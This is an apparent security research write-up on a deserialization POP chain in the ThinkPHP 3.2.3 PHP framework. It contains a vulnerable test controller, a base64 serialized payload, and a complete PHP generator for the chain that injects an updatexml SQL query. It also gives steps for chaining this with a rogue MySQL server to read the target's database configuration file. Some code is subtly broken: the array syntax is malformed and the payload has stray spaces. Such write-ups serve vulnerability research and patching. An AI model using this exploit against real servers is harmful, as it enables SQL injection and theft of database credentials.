# ThinkPHP3.2.x Deserialization

Author: H3rmesk1t

Data: 2021.08.10

# Initial configuration
- Here is a sample using ThinkPHP3.2.3, [click here to download](http://www.thinkphp.cn/donate/download/id/610.html)
- The php version uses PHP5 (the ThinkPHP framework from PHP7 does not pass parameters when calling parameter functions will trigger error handling in the framework)
- In the downloaded source code, the content of `Application/Home/Controller/IndexController.class.php` needs to be modified

```php
<?php
namespace Home\Controller;
use Think\Controller;
class IndexController extends Controller {
    public function index(){
        $this->show('<style type="text/css">*{ padding: 0; margin: 0; } div{ padding: 4px 48px;} body{ background: #fff; font-family: "Microsoft Yahei"; color: #333;font-size: 24px} h1{ font-size: 100px; font-weight: normal; margin-bottom: 12px; } p{ line-height: 1.8em; font-size: 36px } a,a:hover{color:blue;}</style><div style="padding: 24px 48px;"<h1>:)</h1><p>Welcome to <b>ThinkPHP</b>! </p><br/> Version V{$Think.version}</div><script type="text/javascript" src="http://ad.topthink.com/Public/static/client.js"></script><thinkad id="ad_55e75dfae343f5a1"></thinkad><script type="text/javascript" src="http://tajs.qq.com/stats?sId=9347272" charset="UTF-8"></script>','utf-8');
    }
    public function d1no(){
        unserialize(base64_decode(file_get_contents('php://input')));
        phpinfo();
    }
}
```
# Vulnerability Exploit

Payload

```shell
TzoyNjoiVGhpbmtcSW1hZ2VcRHJpdmVyXEltYWdpY2siOjE6e3M6MzE6IgBUaGlua1xJbWFnZVxEcmml2ZXJcSW1hZ2ljawBpbWciO086Mjk6IlRoaW5rXFNlc3Npb25cRHJpdmVyXE1lbWNhY2hlIjoxOntzOjk6IgAqAGhhbmRsZSI7TzoxMToiVGhpbmtcTW9kZWwiOjQ6e3M6MTA6IgAqAG9wdGlvb nMiO2E6MTp7czo1OiJ3aGVyZSI7czowOiIiO31zOjU6IgAqAHBrIjtzOjI6ImlkIjtzOjc6IgAqAGRhdGEiO2E6MTp7czoyOiJpZCI7YToyOntzOjU6InRhYmxlIjtzOjYzOiJ0aGlua3BocC51c2VycyB3aGVyZSAxPXVwZGF0ZXhtbCgxLGNvbmNhdCgweDdlLHVzZXIoKSwweDdlKSwxKSMiO3M6NT oid2hlcmUiO3M6MzoiMT0xIjt9fXM6NToiACoAZGIiO086MjE6IlRoaW5rXERiXERyaXZlclxNeXNxbCI6Mjp7czoxMDoiACoAb3B0aW9ucyI7YToxOntpOjEwMDE7YjoxO31zOjk6IgAqAGNvbmZpZyI7YTo4OntzOjU6ImRlYnVnIjtpOjE7czo0OiJ0eXBlIjtzOjU6Im15c3FsIjtzOjg6ImRhdGF iYXNlIjtzOjg6InRoaW5rcGhwIjtzOjg6Imhvc3RuYW1lIjtzOjk6IjEyNy4wLjAuMSI7czo4OiJob3N0cG9ydCI7czo0OiIzMzA2IjtzOjc6ImNoYXJzZXQiO3M6NDoidXRmOCI7czo4OiJ1c2VybmFtZSI7czo4OiJ0aGlua3BocCI7czo4OiJwYXNzd29yZCI7czo4OiJ0aGlua3BocCI7fX19fX0=
```
![Insert the picture description here](https://img-blog.csdnimg.cn/7e07b39f56f44f958cadb729f2718a98.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

# Vulnerability Analysis
## POP chain analysis

First find the starting point of a chain and search globally `__destruct`

![Insert the picture description here](https://img-blog.csdnimg.cn/a8ead6d7416344fe9876f0591983e265.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

After checking, I found that many of them are `free()` or `fclose()`, two of which are worth noting. After analysis, I positioned one of them: `ThinkPHP\Library\Think\Image\Driver\Imagick.class.php`

![Insert the picture description here](https://img-blog.csdnimg.cn/62595d3ad56a4a4dae91e0c59bf5842f.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

Here, `$this->img` refers to the member variable img in this class. It is completely controllable. The `destroy()` of `$this->img` is called. The method is searched globally to find a springboard class containing the `destroy()` member method, follow up `ThinkPHP\Library\Think\Session\Driver\Memcache.class.php`

![Insert the picture description here](https://img-blog.csdnimg.cn/9662ee8b5dee44b2862dabb552ce91c8.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

In the previous step, the value was not passed when the `destroy() method is called in `Imagick::__destruct`, so the formal parameter `$sessID` is empty (this is why you used PHP5 before. If you call the parameter function in PHP7, it will trigger the error processing in the framework, resulting in an error). The `$this->handle` is controllable, and the `delete()` method of `$this->handle` is called, and the passed parameters are partially controllable. Therefore, you can continue to look for a springboard class with the `delete()` method and follow up with `ThinkPHP\Mode\Lite\Model.class.php`

![Insert the picture description here](https://img-blog.csdnimg.cn/36b6474097bd4d799c48a84d74ba7f90.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

The `$pk` here is actually `$this->pk`, which is completely controllable. The `$options` below is passed from the first springboard class. In the first springboard class, it can control whether it is empty. `$this->options['where']` is a member attribute and is also controllable, so the program can be controlled.
Go to `return $this->delete($this->data[$pk]);`, and I called myself `$this->delete()` again, but the parameter `$this->data[$pk]` at this time is controllable. At this time, `delete()` can be accessed with controllable parameters. This is the `delete()` method in the database model class of ThinkPHP. It will eventually be called into `delete()` in the database driver class. And a bunch of conditional judgments in the code are obviously controllable, including the `$options` parameter when calling `$this->db->delete($options)` that can also be controlled. Then you can call the `delete()` method in any of the database class that comes with it.

![Insert the picture description here](https://img-blog.csdnimg.cn/d522d237a756406cb8ac8eea977ccf83.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

Follow up on `ThinkPHP\Library\Think\Db\Driver.class.php`. Since the incoming parameters are completely controllable, the `$table` here is controllable. Splicing `$table` to `$sql` and passing in `$this->execute()`

![Insert the picture description here](https://img-blog.csdnimg.cn/0512627f037544c4bd2b9d69e6774e92.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

Follow up on `ThinkPHP\Library\Think\Db\Driver\Firebird.class.php`, here is a method to initialize the database link.

![Insert the picture description here](https://img-blog.csdnimg.cn/76c5f6f5f2b14ceb8a47f1692fc9bbca.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

Follow up on `ThinkPHP\Library\Think\Db\Driver.class.php`, here `initConnect` method can control member properties and make the program call `$this->connect()`

![Insert the picture description here](https://img-blog.csdnimg.cn/eebc0008dddc4e78b07d08a03abee75a.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

Follow up on `ThinkPHP\Library\Think\Db\Driver.class.php`, you can see that here you use the configuration in `$this->config` to create a database connection, and then execute the `DELETE SQL statement in the previous splicing`

![Insert the picture description here](https://img-blog.csdnimg.cn/26c6d51be52f441694891696e506273c.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
## POP chain construction

```php
<?php
namespace Think\Image\Driver{
	use Think\Session\Driver\Memcache;
	class Imagick{
		private $img;

		public function __construct(){
			$this->img = new Memcache();
		}
	}
}

namespace Think\Session\Driver{
	use Think\Model;
	class Memcache{
		protected $handle;

		public function __construct(){
			$this->handle = new Model();
		}
	}
}

namespace Think{
	use Think\Db\Driver\Mysql;
	class Model{
		protected $options = array();
		protected $pk;
		protected $data = array();
		protected $db = null;

		public function __construct(){
			$this->db = new Mysql();
			$this->options['where'] = '';
			$this->pk = 'id';
			$this->data[$this->pk] = array(
				'table' ='thinkphp.users where 1=updatexml(1,concat(0x7e,user(),0x7e),1)#',
				'where' ='1=1'
			);
		}
	}
}

namespace Think\Db\Driver{
	use PDO;
	class Mysql{
		protected $options = array(
            PDO::MYSQL_ATTR_LOCAL_INFILE =true // Only by turning on can the file be read
        );
        protected $config = array(
            "debug" =1,
            'type' ="mysql",
            "database" ="thinkphp",
            "hostname" ="127.0.0.1",
            "hostport" ="3306",
            "charset" ="utf8",
            "username" ="thinkphp",
            "password" ="thinkphp"
        );
	}
}

namespace {
	echo base64_encode(serialize(new Think\Image\Driver\Imagick()));
}
?>
```
## Vulnerability Exploit

The normal utilization process of this POP chain should be:
- Database configuration for leaking the target somewhere
- Trigger deserialization
- Trigger SQL injection of DELETE statement in chain

But if it is just like this, then this chain is actually very useless, but because any database can be connected here, you can consider using the MySQL malicious server to read client files vulnerability.

In this way, the utilization process becomes:
- Extract the target's WEB directory (e.g. DEBUG page)
- Enable the malicious MySQL malicious server to set the read file as the target database configuration file
- Trigger deserialization
- The part of the triggering PDO connection in the chain
- Get the database configuration of the target
- Deserialization again using the target database configuration
- Trigger SQL injection of DELETE statement in chain

# Reference article

You can view the reference article to obtain a more detailed way to exploit it: [https://mp.weixin.qq.com/s/S3Un1EM-cftFXr8hxG4qfA](https://mp.weixin.qq.com/s/S3Un1EM-cftFXr8hxG4qfA)